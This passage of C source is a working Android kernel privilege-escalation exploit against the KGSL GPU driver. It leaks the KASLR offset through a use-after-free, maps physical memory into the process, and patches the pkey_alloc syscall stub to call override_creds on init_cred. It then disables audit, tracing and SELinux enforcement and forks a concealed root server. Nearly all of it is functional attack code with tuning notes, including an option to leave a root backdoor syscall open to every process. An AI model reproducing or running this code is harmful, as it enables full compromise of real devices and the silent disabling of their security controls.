        if (nr > 0 && setup_ib(&st_g) != 0) { L("[!] st ctx FAILED\n"); uaf_pause(); }
        /* Newest first, as above. This loop also has to refresh g_wd_round
           itself: the watchdog fires on now - g_wd_round > 30s and nothing
           after the spray updates it, so without this the loop trips the
           timeout. */
        for (int hi = nr - 1; hi >= 0; hi--) {
            { struct timespec wd1; clock_gettime(CLOCK_MONOTONIC, &wd1); g_wd_round = (long long)wd1.tv_sec; }
            uint64_t ep = DANGLING_BASE + ((uint64_t)hit_pages[hi] << 12) +
                (uint64_t)hit_slots[hi] * 512;
            struct kgsl_gpuobj_info ti = { .id = hit_ids[hi] };
            /* The default path never writes +0x30; only LEGACY_BLIND_WRITE does,
               and then the size check below fails. The discriminating power comes
               from gpuaddr and flags, which cross-check against the info ioctl. */
            uint32_t exp_size = 0x1000u;
            uint32_t rm[16], rc[16];
            static const uint32_t soff[16] = {
                0x08, 0x0c, 0x20, 0x24, 0x28, 0x2c, 0x30, 0x34,
                0x40, 0x48, 0x4c, 0x50, 0x54, 0x58, 0x5c, 0x38 };
            enum { P_PT_LO, P_PT_HI, P_GPA_LO, P_GPA_HI, P_PH_LO, P_PH_HI,
                   P_SZ_LO, P_SZ_HI, P_SGT_LO, P_OPS_LO, P_OPS_HI,
                   P_FLG_LO, P_FLG_HI, P_DEV_LO, P_DEV_HI, P_PRIV_LO };
            if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &ti) != 0) continue;
            memset(rm, 0xEE, sizeof(rm));
            memset(rc, 0xDD, sizeof(rc));
            for (int pass = 0; pass < 2; pass++) {
                uint32_t ib[8 + 16 * 6 + 8], len = 0;
                len += cp_nop(&ib[len], 0x0);
                for (int k = 0; k < 16; k++)
                    len += cp_mem_to_mem(&ib[len], ep + soff[k],
                        dst_g + 0x6000 + (uint32_t)k * 4);
                len += cp_wait_mem_writes(&ib[len]);
                len += cp_nop(&ib[len], 0x0);
                volatile uint32_t *pv = (volatile uint32_t *)((char *)dst_u + 0x6000);
                for (int k = 0; k < 16; k++) pv[k] = 0xD00DFEEDu;
                if (gpuobj_sync(dst_id, 0x6000, 64, KGSL_GPUMEM_CACHE_CLEAN) == 0 &&
                    submit_ib(&st_g, ib, len) == 0 &&
                    wait_submit_retire(st_g.ctx, last_submit_ts) == 0 &&
                    gpuobj_sync(dst_id, 0x6000, 64, KGSL_GPUMEM_CACHE_INV) == 0) {
                    memcpy(rm, (const void *)pv, sizeof(rm));
                    break;
                }
                L("[!] ST[%d] M2M batch failed errno=%d; rebuilding ctx and retrying\n", hi, errno);
                log_fsync();
                rebuild_ctx_empty(&st_g);
            }
            {
                uint32_t ib[8 + 16 * 6 + 8], len = 0;
                len += cp_nop(&ib[len], 0x0);
                for (int k = 0; k < 16; k++)
                    len += cp_memcpy(&ib[len], 1, ep + soff[k],
                        dst_g + 0x6100 + (uint32_t)k * 4);
                len += cp_wait_mem_writes(&ib[len]);
                len += cp_nop(&ib[len], 0x0);
                volatile uint32_t *pv = (volatile uint32_t *)((char *)dst_u + 0x6100);
                for (int k = 0; k < 16; k++) pv[k] = 0xD00DFEEDu;
                if (gpuobj_sync(dst_id, 0x6100, 64, KGSL_GPUMEM_CACHE_CLEAN) == 0 &&
                    submit_ib(&st_g, ib, len) == 0 &&
                    wait_submit_retire(st_g.ctx, last_submit_ts) == 0 &&
                    gpuobj_sync(dst_id, 0x6100, 64, KGSL_GPUMEM_CACHE_INV) == 0)
                    memcpy(rc, (const void *)pv, sizeof(rc));
            }
            int ok_sz  = (rm[P_SZ_LO] == exp_size);
            int ok_gpa = (rm[P_GPA_LO] == (uint32_t)ti.gpuaddr &&
                          rm[P_GPA_HI] == (uint32_t)(ti.gpuaddr >> 32));
            int ok_flg = (rm[P_FLG_LO] == (uint32_t)ti.flags &&
                          rm[P_FLG_HI] == (uint32_t)(ti.flags >> 32));
            n_sz_ok += ok_sz; n_gpa_ok += ok_gpa; n_flg_ok += ok_flg;
            uint64_t ops_m = ((uint64_t)rm[P_OPS_HI] << 32) | rm[P_OPS_LO];
            uint64_t ops_c = ((uint64_t)rc[P_OPS_HI] << 32) | rc[P_OPS_LO];
            L("[*] ST[%d] id=%u pg=%d sz=%08x/%08x%s gpa=%08x%08x%s "
              "flg=%08x%08x%s opsM=%08x%08x opsC=%08x%08x "
              "pt=%08x%08x dev=%08x%08x\n",
              hi, hit_ids[hi], hit_pages[hi],
              rm[P_SZ_LO], exp_size, ok_sz ? "OK" : "XX",
              rm[P_GPA_HI], rm[P_GPA_LO], ok_gpa ? "OK" : "XX",
              rm[P_FLG_HI], rm[P_FLG_LO], ok_flg ? "OK" : "XX",
              rm[P_OPS_HI], rm[P_OPS_LO], rc[P_OPS_HI], rc[P_OPS_LO],
              rm[P_PT_HI], rm[P_PT_LO], rm[P_DEV_HI], rm[P_DEV_LO]);
            log_fsync();
            if (ok_sz && ok_gpa && ok_flg) {
                n_full++;
                /* Record the victim's page table VA: its contents hold a known
                   PFN run, which the scan can pair up to solve for the
                   mapping base. */
                if (pt_leak == 0)
                    pt_leak = ((uint64_t)rm[P_PT_HI] << 32) | rm[P_PT_LO];
                /* The delta differs on every boot, so accept any pointer whose
                   top 16 bits are 0xffff and whose low 12 bits match
                   kgsl_pool_ops, and that is not the fill pattern. */
                uint64_t oc = ((ops_m >> 48) == 0xffffu &&
                               (ops_m & 0xfffULL) == (ST_POOL_OPS_LINK & 0xfffULL))
                                  ? ops_m : ops_c;
                if ((oc >> 48) == 0xffffu &&
                    oc != 0xD00DFEEDD00DFEEDULL && (oc >> 32) != 0xffffffffu) {
                    ops_cand[n_ops_cand++] = oc;
                    if (nv_v < 8) { v_ids[nv_v] = hit_ids[hi]; v_eps[nv_v] = ep; nv_v++; }
                }
            }
            usleep(20 * 1000);
        }
        L("[D] summary: full-validate %d/%d (sz %d gpa %d flg %d) candidates %d\n",
          n_full, nr, n_sz_ok, n_gpa_ok, n_flg_ok, n_ops_cand);
        uint64_t delta = 0; int have_delta = 0;
        if (n_ops_cand > 0) {
            uint64_t agree = ops_cand[0]; int nagree = 1;
            for (int i = 1; i < n_ops_cand; i++)
                if (ops_cand[i] == agree) nagree++;
            g_pool_ops_rt = agree;   /* runtime ops pointer, read by FREE_ALL and heal */
            g_delta = agree - ST_POOL_OPS_LINK;   /* KASLR delta, used to turn a link VA into a physical address */
            delta = agree - ST_POOL_OPS_LINK;
            have_delta = ((delta & 0x1fffffULL) == 0);
            L("[+] POOL_OPS runtime=0x%llx (%d/%d agree) delta=0x%llx %s\n",
              (unsigned long long)agree, nagree, n_ops_cand,
              (unsigned long long)delta, have_delta ? "(2MB-aligned)" : "(!!misaligned)");
            L("[+] runtime _text=%llx contig=%llx modprobe_pa=%llx selinux_pa=%llx\n",
              (unsigned long long)(ST_TEXT_LINK + delta),
              (unsigned long long)(ST_CONTIG_LINK + delta),
              (unsigned long long)PA_OF(ST_MODPROBE_LINK),
              (unsigned long long)(PA_OF(ST_SELINUX_LINK) + 1));
        } else if (n_full > 0) {
            L("[!] full validation passed but ops is out of spec; dumping details for analysis\n");
        }
        log_fsync();
        if (mode_st || !have_delta || !nv_v) {
            L("[*] slidetest complete; pausing to preserve the device\n");
            log_fsync();
            uaf_pause();
        }

/* Map a 3GiB window at 0x80000000, walk the task_struct list through it and
   rewrite a credential in place. The layout constants are OFF_TASKS, OFF_CRED
   and OFF_COMM below; the correction note that follows explains their values. */
        /* Low-bank comm scan, then solve for the mapping base and rewrite one
           credential. Addresses above 4GB overlap the XPU region, where a CPU
           probe means a reboot with no warning, so everything stays inside
           0x80000000-0xFFFFFFFF. Pure memory reads, no ioctl: the idr behind
           the info call may already be broken by a stray write. The comm
           signature is scanned at 4KB stride at page+OFF_COMM, assuming the
           task page is aligned; candidate bases LOW_BASE - k*1GB are then
           tried in turn and the list walk keeps the one that holds. The
           credential is rewritten only behind a uid == 2000 gate, and
           getuid() == 0 afterwards is the proof. */
        {
            const uint64_t PAGE_OFF = 0xffffff8000000000ULL;
            const int OFF_TASKS = 1360, OFF_CRED = 2040, OFF_COMM = 2056;
#define SWEEP_HI_CAP 0x128000000ULL   /* 4.625GiB, 384MiB below the 5GiB top of the window */
            /* Offsets: pid_type carries PIDTYPE_TGID, so pid_links[4] is 64
               bytes. Constants taken from the three-entry layout are 16 bytes
               short, which puts the candidate just before the real task_struct
               and makes tasks.next read misaligned garbage - that alone killed
               the comm-scan route. */
            const uint64_t LOW_BASE = 0x80000000ULL, LOW_SIZE = 0xC0000000ULL;
            uint32_t vid = v_ids[0]; uint64_t vep = v_eps[0];
            g_rel_victim_ep = vep; g_rel_victim_id = vid;
            uint64_t contig_rt = ST_CONTIG_LINK + delta;

            if (!canary_ok(600)) {
                rebuild_ctx_empty(&st_g);
                if (!canary_ok(600)) {
                    L("[!] canary failed twice (device-level wedge); pausing\n");
                    log_fsync();
                    uaf_pause();
                }
                L("[+] recovered after canary rebuild\n");
            }
            /* victim#0: point contig ops, physaddr and size at the low bank so
               the 3GB window maps into this process. */
            {
                uint64_t woffs[8]; uint32_t wvals[8];
                woffs[0]=0x48; wvals[0]=(uint32_t)contig_rt;
                woffs[1]=0x4c; wvals[1]=(uint32_t)(contig_rt>>32);
                woffs[2]=0x30; wvals[2]=(uint32_t)LOW_SIZE;
                woffs[3]=0x34; wvals[3]=0x0;
                woffs[4]=0x28; wvals[4]=(uint32_t)LOW_BASE;
                woffs[5]=0x2c; wvals[5]=0x0;
                if (gpu_write_words(&st_g, vep, woffs, wvals, 6, "LOWMAP") != 0) {
                    rebuild_ctx_empty(&st_g);
                    if (gpu_write_words(&st_g, vep, woffs, wvals, 6, "LM-r") != 0)
                        uaf_pause();
                }
                uint64_t szv = 0; int ok2 = 0;
                for (int t = 0; t < 8 && !ok2; t++) {
                    usleep(150 * 1000);
                    if (gpuobj_info_size(vid, &szv) == 0 && szv == LOW_SIZE) ok2 = 1;
                    else gpu_write_words(&st_g, vep, woffs, wvals, 6, "LM-v");
                }
                if (!ok2) { L("[!] size did not land; pausing\n"); log_fsync(); uaf_pause(); }
                L("[D] low bank size landed=%llx\n", (unsigned long long)szv);
            }
            log_fsync();
            void *lmp = mmap(NULL, LOW_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED,
                kgsl_fd, ((off_t)vid) << 12);
            L("[D] low bank mmap=%p errno=%d\n", lmp, errno);
            log_fsync();
/* Gate the mmap here: a failed map leaves g_lb as MAP_FAILED, and every later
   write through it, including the restore path, would land on an arbitrary
   address. This mapping has failed before with errno=12. */
            if (lmp == MAP_FAILED) {
                L("[D] low bank mmap failed (errno=%d); parking, g_lb left unset\n", errno);
                log_fsync();
                uaf_pause();
            }
            volatile uint8_t *lb = (volatile uint8_t *)lmp;
            g_lb = lb;   /* global window pointer for RO_FLUSH */
            g_img_pa = 0xa0080000ULL;

/* Replace the __arm64_sys_pkey_alloc stub, a syscall Android never calls, with
   a tail jump: adrp+add materialises &init_cred and a branch goes to
   override_creds, which is enough because it leaves real_cred alone. The patch
   address is a fixed physical address inside the window, so it needs no KASLR
   adjustment. */
            if (mode_root && have_delta) {
/* Disable audit before patching: audit_syscall_exit() can block on the
   audit_backlog lock while accounting for the credential change, which wedges
   the run at syscall exit rather than in the payload. Zero audit_enabled in
   kernel .data first. */
                {
/* Fixed-address write, no KASLR adjustment: PA = KNOWN_IMG + (link -
   ST_TEXT_LINK), which is what the conversion further below computes. The
   window check only rejects an address outside the window; a wrong base that
   lands inside it is not caught. */
                    const uint64_t AUDIT_EN_LINK = 0xffffffc012cec624ULL;
                    uint64_t ae_pa2 = 0xa0080000ULL +
                        (AUDIT_EN_LINK - 0xffffffc010080000ULL);
                    if (ae_pa2 >= LOW_BASE && ae_pa2 < LOW_BASE + LOW_SIZE &&
                        sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        volatile uint32_t *ae =
                            (volatile uint32_t *)(lb + (ae_pa2 - LOW_BASE));
                        uint32_t old_ae = *ae;
                        if (old_ae != 0) { *ae = 0; }
                        uint32_t rb_ae = *ae;
                        jmp_armed = 0;
                        L("[PKEY] audit_enabled %u->0 rb=%u %s\n",
                          old_ae, rb_ae, rb_ae == 0 ? "✓" : "FAIL");
                        log_fsync();
                    } else { jmp_armed = 0; }
                }
            }
            if (mode_root && have_delta && !env_on("UMHONLY")) {
/* Three words, and those are the only side effects: no branch with link, so
   x30 still holds the syscall's caller return address; no load or store, no
   stack, no pkey allocation. */
                const uint64_t PATCH_PA = 0xa0313994ULL;
                const uint64_t PATCH_VA_LINK = 0xffffffc010313994ULL;
                const uint64_t COMMIT_CREDS = 0xffffffc010315ee8ULL + delta;
                const uint64_t INIT_CRED_VA = 0xffffffc012b080f8ULL + delta;
/* override_creds() is the smaller of the two: no user accounting, no proc
   connector, and real_cred is left alone. */
                const uint64_t OVERRIDE_CREDS =
                    0xffffffc010316278ULL + delta;
                uint32_t *pp = (uint32_t *)(void *)(lb + (PATCH_PA - LOW_BASE));
                const uint64_t pc0 = PATCH_VA_LINK + delta;
                uint32_t pay[8]; int payload_words = 0;
/* Read the stub and the head of override_creds before touching anything: both
   are printed as the before/after baseline, and the stub words are what the
   gate below checks. It must hold exactly mov x0,#-ENOSYS; ret (928004a0
   d65f03c0) - the b sys_ni_syscall form an uninlined stub would have is
   rejected. */
                uint32_t st0 = pp[0], st1 = pp[1];
                uint32_t ov0 = 0, ov1 = 0;
                {
/* Equivalent to KNOWN_IMG + (link - ST_TEXT_LINK), and it yields 0xa0316278
   for override_creds. Do not route this through PA_OF(): its IMAGE_PA base
   differs by 0x10000000 and lands at 0x90316278, still inside the window, so
   the check cannot catch it and the wrong 256MiB of physical pages is read and
   written. */
                    uint64_t ov_pa = (OVERRIDE_CREDS - delta) -
                        0xffffffc010000000ULL + 0xa0000000ULL;
                    if (ov_pa >= LOW_BASE && ov_pa < LOW_BASE + LOW_SIZE) {
                        volatile uint32_t *ovp = (volatile uint32_t *)(void *)
                            (lb + (ov_pa - LOW_BASE));
                        ov0 = ovp[0]; ov1 = ovp[1];
                    }
                }
                int64_t adv = (int64_t)(INIT_CRED_VA & ~0xfffULL) -
                              (int64_t)(pc0 & ~0xfffULL);
                pay[payload_words++] = 0x90000000u |
                    ((uint32_t)((adv >> 12) & 3u) << 29) |
                    ((uint32_t)(((uint64_t)adv >> 14) & 0x7ffffu) << 5) | 0u;
                pay[payload_words++] = 0x9103e000u;   /* add x0, x0, #0xf8 */
                {
/* b override_creds: imm26 = (target - (pc0 + 8)) >> 2. */
                    int64_t d2 = (int64_t)OVERRIDE_CREDS -
                                 (int64_t)(pc0 + 8);
                    pay[payload_words++] = 0x14000000u |
                        (uint32_t)((d2 >> 2) & 0x3ffffff);   /* b override */
                }
                L("[PKEY-STUB] stub original %08x %08x | override head %08x %08x\n",
                  st0, st1, ov0, ov1);
                log_fsync();
/* Wrong-target gate, fail closed: pp must still hold the pkey_alloc stub
   (928004a0 = mov x0,#-ENOSYS, d65f03c0 = ret). A wrong delta, a moved symbol
   or a stray pp fails this check and the patch is skipped, rather than writing
   the payload into whatever kernel text it happens to point at. */
                if (st0 != 0x928004a0u || st1 != 0xd65f03c0u) {
                    L("[PKEY] patch target mismatch (st0=%08x st1=%08x); skipping patch, fail-closed\n",
                      st0, st1);
                    log_fsync();
                } else if (sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
/* Save the words the payload overwrites, so the restore path can put them
   back: pp[0..1] are the stub already read as st0/st1, pp[2] has to be copied
   out now. */
                    g_pkey_stub = pp;
                    g_pkey_stub_backup[0] = st0; g_pkey_stub_backup[1] = st1;
                    for (int k2 = 2; k2 < payload_words && k2 < 8; k2++)
                        g_pkey_stub_backup[k2] = pp[k2];   /* save the original word */
                    for (int k2 = 0; k2 < payload_words; k2++) pp[k2] = pay[k2];
                    cache_maint_el0((void *)pp, payload_words * 4);
                    g_pkey_payload_nwords = payload_words;
                    uint32_t rb0 = pp[0];
                    uint32_t rb2 = pp[2];
                    jmp_armed = 0;
                    L("[PKEY] patch PA=%llx w0=%08x w2=%08x %s\n",
                      (unsigned long long)PATCH_PA, rb0, rb2,
                      rb0 == pay[0] && rb2 == pay[2] ? "(landed ✓)" : "(FAIL)");
                    log_fsync();
/* Tracepoints off, unconditionally: the sys_exit listener callback wedges once the
   mapping is dangling. This runs before the credential override, so both opens
   return EACCES and the writes do nothing either way -- kept because a wedged
   tracepoint would outlive the run. */
                    {
                        int tf = open("/sys/kernel/tracing/tracing_on",
                                      O_WRONLY);
                        if (tf >= 0) {
                            (void)write(tf, "0", 1);
                            close(tf);
                        }
                        tf = open("/sys/kernel/tracing/events/enable",
                                  O_WRONLY);
                        if (tf >= 0) {
                            (void)write(tf, "0", 1);
                            close(tf);
                        }
                        L("[PKEY] tracing off attempt\n");
                        log_fsync();
                    }
                    /* Bisect with a payload-free call first: getpid shares the dispatch table,
                       the wrapper and the exit path, so a hang there is an exit-path problem
                       while a hang in syscall(289) is a payload problem. */
                    long gp0 = syscall(__NR_getpid);
                    L("[PKEY-STUB] getpid=%ld ok ✓ (exit path clear)\n", gp0);
                    log_fsync();
/* Main issues syscall(289) directly. It can stall in the syscall exit path
   rather than in the payload -- creds are already overridden and main is already
   uid 0 -- so set g_pkey_call_inflight first and let the watchdog verify. */
                    g_pkey_call_inflight = 1;
/* Retry silently: 0.5 s sleep and a different core before each attempt, so stale
   L1I lines cannot keep reusing the same path. No probe writes around the call:
   writeback drops them too easily to trust, so the pass/fail criterion is polled
   from outside instead. */
                    uid_t gu2 = 99;
                    cpu_set_t allowed; CPU_ZERO(&allowed);
                    sched_getaffinity(0, sizeof(allowed), &allowed);
                    int ncpu = CPU_COUNT(&allowed); if (ncpu < 1) ncpu = 1;
                    for (int att = 0; att < 4 && gu2 != 0; att++) {
                        if (att > 0) {
                            struct timespec rq = { .tv_sec = 0,
                                                   .tv_nsec = 500L*1000*1000 };
                            syscall(SYS_nanosleep, &rq, NULL);
                            if (sigsetjmp(jmpbuf2, 1) == 0) {
                                jmp2_armed = 1;
                                uint32_t r0 = pp[0], r2 = pp[2];
                                if (r0 != pay[0] || r2 != pay[2])
                                    for (int k3 = 0; k3 < payload_words; k3++)
                                        pp[k3] = pay[k3];
                                jmp2_armed = 0;
                            } else { jmp2_armed = 0; break; }
                        }
                        /* Pin each attempt to a different allowed core for a cold ifetch. */
                        { int seen = 0;
                          for (int c = 0; c < CPU_SETSIZE && seen < ncpu; c++)
                              if (CPU_ISSET(c, &allowed)) {
                                  if (seen == att % ncpu) {
                                      cpu_set_t m; CPU_ZERO(&m); CPU_SET(c, &m);
                                      sched_setaffinity(0, sizeof(m), &m); break;
                                  }
                                  seen++;
                              }
                        }
/* ic ivau is a no-op in this window; l1i_capacity_evict() does the real eviction. */
                        cache_maint_el0((void *)pp, payload_words * 4);
/* att < 4 bounds the loop by count, not time, so it cannot run away, but there
   is no feed point inside: l1i_capacity_evict() moves 16 MiB of writes plus a 16 MiB
   reverse read and a 256 KiB RET sled per round, so four rounds still share the
   30 s wall. */
                        l1i_capacity_evict();
                        g_pkey_call_inflight = 1;
/* The flag has to be set before the call: a hang in the call and a hang in the
   following log write are otherwise indistinguishable. */
                        long pk = syscall(289, 0, 0, 0, 0);
g_pkey_ret = pk;                    /* kept in memory: a log write under load can block */
                        g_pkey_call_inflight = 0;
                        gu2 = (uid_t)syscall(SYS_getuid);
                        g_uid_after_pkey = (int)gu2;

/* The verdict goes to tmpfs (/dev) only: a write to f2fs under load can block
   forever. */
                        {
                            int vfd = (int)syscall(SYS_openat, AT_FDCWD,
                                "/dev/pkey_hijack_verdict.txt", 01|0100|02000, 0644);
                            if (vfd >= 0) {
                                char vb[64]; int vn = 0;
                                const char *V1 = "att=";
                                for (const char *z = V1; *z; z++) vb[vn++] = *z;
                                vb[vn++] = (char)('0' + att);
                                vb[vn++] = ' '; vb[vn++] = 'p'; vb[vn++] = 'k'; vb[vn++] = '=';
                                long pv = pk; char nb[24]; int nn = 0;
                                if (pv < 0) { vb[vn++] = '-'; pv = -pv; }
                                if (!pv) nb[nn++] = '0';
                                while (pv) { nb[nn++] = (char)('0' + pv % 10); pv /= 10; }
                                while (nn) vb[vn++] = nb[--nn];
                                const char *V2 = " uid=";
                                for (const char *z = V2; *z; z++) vb[vn++] = *z;
                                nn = 0; pv = (long)gu2;
                                if (!pv) nb[nn++] = '0';
                                while (pv) { nb[nn++] = (char)('0' + pv % 10); pv /= 10; }
                                while (nn) vb[vn++] = nb[--nn];
                                vb[vn++] = '\n';
                                ssize_t w = write(vfd, vb, vn); (void)w;
                                close(vfd);
                            }
                        }
                    }
                    if (gu2 != 0) {
/* Dispatch canary: write mov w0,#0x1234; ret into the neighbouring pkey_mprotect
   stub and call 288. 4660 means the table does reach the stub, so the payload is
   at fault; -38 (ENOSYS) means 288 and 289 do not go through these stubs at all. */
                        volatile uint32_t *mp = pp - 2;
                        uint32_t m0 = mp[0], m1 = mp[1];
                        if (sigsetjmp(jmpbuf3, 1) == 0) {
                            jmp3_armed = 1;
                            mp[0] = 0x52824680u;   /* mov w0, #0x1234 */
                            mp[1] = 0xd65f03c0u;   /* ret */
                            cache_maint_el0((void *)mp, 8);
                            long c288 = syscall(288, 0, 0, 0, 0);
                            mp[0] = m0; mp[1] = m1;
                            cache_maint_el0((void *)mp, 8);
                            jmp3_armed = 0;
                            L("[PKEY-ORACLE] 288->%ld (expect 4660=GO-dispatch)\n", c288);
                            log_fsync();
                        } else { jmp3_armed = 0; }
                    }
                    if (gu2 == 0) {
                        main_rooted = 1; rooted = 1;
                    }
/* A failed attempt does not stop the chain: main carries on and forks the parked
   server, so every existing check reports success anyway. g_pkey_call_inflight is a userspace
   flag the payload never stores, so g_pkey_call_inflight == 0 does not mean the hijack never
   ran -- only rooted below is trustworthy. Bailing out here instead would trip the
   kgsl teardown crash. */
                    if (gu2 == 0) {
                        L("[PKEY] VERDICT=PASS uid=0 (pkey_hijack patch active, root obtained)\n");
                    } else {
                        L("[PKEY] VERDICT=FAIL uid=%ld (all 4 attempts failed to root, this round failed)\n",
                          (long)gu2);
                        L("[PKEY] root-cause candidates: I-cache not invalidated (eviction is a capacity heuristic, "
                          "not an architectural guarantee) or the pinned core refilled it before the syscall\n");
                    }
                    log_fsync();
                    /* Final verdict: the last uid, plus w0 read back out of DRAM. */
                    {
                        int vfd = (int)syscall(SYS_openat, AT_FDCWD,
                            "/dev/pkey_hijack_verdict.txt", 01|0100|02000, 0644);
                        if (vfd >= 0) {
                            char vb[96]; int vn = 0;
                            const char *V1 = "final uid=";
                            for (const char *z = V1; *z; z++) vb[vn++] = *z;
                            char nb[24]; int nn = 0; long pv = (long)gu2;
                            if (!pv) nb[nn++] = '0';
                            while (pv) { nb[nn++] = (char)('0' + pv % 10); pv /= 10; }
                            while (nn) vb[vn++] = nb[--nn];
                            const char *V2 = " w0=";
                            for (const char *z = V2; *z; z++) vb[vn++] = *z;
                            uint32_t w0r = pp[0];
                            for (int sh = 28; sh >= 0; sh -= 4) { int dg = (int)((w0r >> sh) & 0xf); vb[vn++] = (char)(dg < 10 ? '0' + dg : 'a' + dg - 10); }
                            vb[vn++] = '\n';
                            ssize_t w = write(vfd, vb, vn); (void)w;
                            close(vfd);
                        }
                    }
                } else { jmp_armed = 0; L("[PKEY] patch write failed\n"); log_fsync(); }
            }

/* PKEY_HIJACK_ONLY fast path, the shipping configuration: once the patched call comes back
   uid 0 the job is done -- no sweep, no cred patch. Fork the root server (no window
   mapping; RESTORE_STUB has to run in main through wdcmd) and leave main parked in
   uaf_pause. */
            if (getenv("PKEY_HIJACK_ONLY") && rooted && !env_on("UMHONLY")) {
                static const char PROBE[] = "[PKEY-GO] rooted fastpath\n";
                syscall(SYS_write, 1, PROBE, sizeof(PROBE) - 1);
                /* SELinux enforcing byte, at a boot-constant offset from the KNOWN_IMG anchor. */
                {
                    const uint64_t KNOWN_IMG2 = 0xa0080000ULL;
                    uint64_t sel_pa = KNOWN_IMG2 + (ST_SELINUX_LINK - ST_TEXT_LINK);
                    if (sel_pa >= LOW_BASE && sel_pa < LOW_BASE + LOW_SIZE &&
                        sigsetjmp(jmpbuf, 1) == 0) {
                        jmp_armed = 1;
                        volatile uint8_t *se =
                            (volatile uint8_t *)(lb + (sel_pa - LOW_BASE) + 1);
                        uint8_t old_se = *se;
                        if (old_se == 1) *se = 0;
                        uint8_t rb_se = *se;
                        jmp_armed = 0;
                        static const char SELMSG[] = "[PKEY-GO] SEL enforcing byte->0 (permissive)\n";
                        syscall(SYS_write, 1, SELMSG, sizeof(SELMSG) - 1);
                        (void)old_se; (void)rb_se;
                    } else { jmp_armed = 0; }
                }
/* Pollute only after root is confirmed. The legacy blind-write path pollutes
   before the syscall stage and changes the whole chain -- the control arm does
   not reach root either -- so root first is what leaves the window contents as
   the single variable. */
                if (getenv("BLIND_WRITE_AFTER_ROOT") && getenv("BLIND_WRITE_AFTER_ROOT")[0] != '0') {
                    static const char PM[] = "[A/B] post-root corruption window (replays the pre-ROSCAN blind writes)\n";
                    syscall(SYS_write, 1, PM, sizeof(PM) - 1);
                    legacy_blind_write(&g, (int)DANGLING_PAGES);
                }
/* No sync() here: once root is confirmed the device can die in this window. */
                pid_t spid = fork();
                if (spid == 0) {
                    signal(SIGSEGV, SIG_DFL);
                    signal(SIGBUS,  SIG_DFL);
                    signal(SIGALRM, SIG_DFL); alarm(0);
                    signal(SIGTERM, SIG_IGN);
                    signal(SIGINT,  SIG_IGN);
                    signal(SIGHUP,  SIG_IGN);
                    int pf = syscall(SYS_openat, AT_FDCWD,
                        "/data/local/tmp/root_proof.txt",
                        O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (pf >= 0) {
                        syscall(SYS_write, pf, "ROOTED_PKEY_HIJACK_FASTPATH\n", sizeof("ROOTED_PKEY_HIJACK_FASTPATH\n") - 1);
                        syscall(SYS_close, pf);
                    }
                    root_fifo_server();   /* noreturn */
                }
/* Print the pid: the root server runs uid0/u:r:kernel:s0, so an adb shell ps never
   sees it and its death leaves no other observer. */
                L("[PKEY-GO] server forked pid=%d ppid=%d\n", (int)spid, (int)getppid());
g_srv_pid = spid;   /* read by the liveness check in uaf_pause */
                log_fsync();
                /* The stub is a root oracle for anyone who can call syscall 289,
                   so it goes back before main parks. POC_KEEP_STUB=1 keeps it for
                   debugging; that leaves the device rooted for every process. */
                if (getenv("POC_KEEP_STUB") && getenv("POC_KEEP_STUB")[0] != '0') {
                    static const char KS[] = "[PKEY-GO] stub kept: POC_KEEP_STUB set, syscall 289 still grants root\n";
                    syscall(SYS_write, 1, KS, sizeof(KS) - 1);
                } else if (restore_pkey_stub_now()) {
                    static const char AR[] = "[PKEY-GO] stub restored: syscall 289 is inert again\n";
                    syscall(SYS_write, 1, AR, sizeof(AR) - 1);
                }
                log_fsync();
                uaf_pause();   /* never returns: main holds the device parked here */
            }

/* Main path: find ImagePA by scanning for the ARM64 header magic, take M from
   memstart_addr in that image, and gate it on the identity kvoff == (link + delta)
   - ImagePA. delta comes from the device kallsyms; the firmware System.map is a
   different build and is off by 0x28A898. */
/* If a D_* offset lands on an unrelated symbol -- the nls unicode table, say --
   the read comes back as zeros or garbage. */
            #define D_MEMSTART   0x02184490ULL   /* memstart_addr - _text, device kallsyms */
            #define D_PHYSVIRT   0x02184498ULL   /* physvirt_offset - _text, device kallsyms */
            #define D_KVOFF      0x021844B0ULL   /* kimage_voffset - _text, device kallsyms */
            #define D_INIT_TASK  0x02A7B580ULL
            #define D_INIT_CRED  0x02A880F8ULL
            uint64_t M_known = 0, image_pa_found = 0;
/* Probe the image anchor before the sweep: a reverse top-down pass is killed by the
   harness watchdog long before it reaches the anchor, which leaves M unknown. The
   bootloader load address is fixed, so read M from there and gate it. */
            {
                const uint64_t KNOWN_IMG = 0xa0080000ULL;
                if ((int64_t)(KNOWN_IMG - LOW_BASE) >= 0 &&
                    sigsetjmp(jmpbuf, 1) == 0) {
                    jmp_armed = 1;
                    uint32_t k_code0 = *(volatile uint32_t *)(lb + (KNOWN_IMG - LOW_BASE));
                    uint64_t k_toff  = *(volatile uint64_t *)(lb + (KNOWN_IMG - LOW_BASE) + 0x08);
                    uint64_t k_ksz   = *(volatile uint64_t *)(lb + (KNOWN_IMG - LOW_BASE) + 0x10);
                    uint32_t k_peoff = *(volatile uint32_t *)(lb + (KNOWN_IMG - LOW_BASE) + 0x3C);
                    uint64_t k_M     = *(volatile uint64_t *)(lb + (KNOWN_IMG - LOW_BASE) + D_MEMSTART);
                    uint64_t k_kvoff = *(volatile uint64_t *)(lb + (KNOWN_IMG - LOW_BASE) + D_KVOFF);
                    uint64_t k_pvoff = *(volatile uint64_t *)(lb + (KNOWN_IMG - LOW_BASE) + D_PHYSVIRT);
                    g_kvo = k_kvoff;
                    jmp_armed = 0;
                    int kg = (k_code0 == 0x91005A4Du) && k_peoff == 0x40 &&
                             k_toff == 0x80000ULL &&
                             k_ksz >= 0x1000000ULL && k_ksz <= 0x8000000ULL;
                    if (kg && have_delta)
                        kg = (k_kvoff == ((ST_TEXT_LINK + delta) - KNOWN_IMG));
                    if (kg && k_pvoff + PAGE_OFF != k_M) kg = 0;
                    if (kg && (k_M & 0x3FFFFFFFULL)) kg = 0;
                    L("[IMG] known ImagePA=0xa0080000 code0=%x toff=%llx "
                      "ksz=%llx peoff=%x M=%llx kvoff=%llx gates=%d\n",
                      k_code0, (unsigned long long)k_toff,
                      (unsigned long long)k_ksz, k_peoff,
                      (unsigned long long)k_M, (unsigned long long)k_kvoff, kg);
                    log_fsync();
                    if (kg) { image_pa_found = KNOWN_IMG; M_known = k_M; }
                    if (kg) g_M = k_M;
                } else { jmp_armed = 0; }
            }
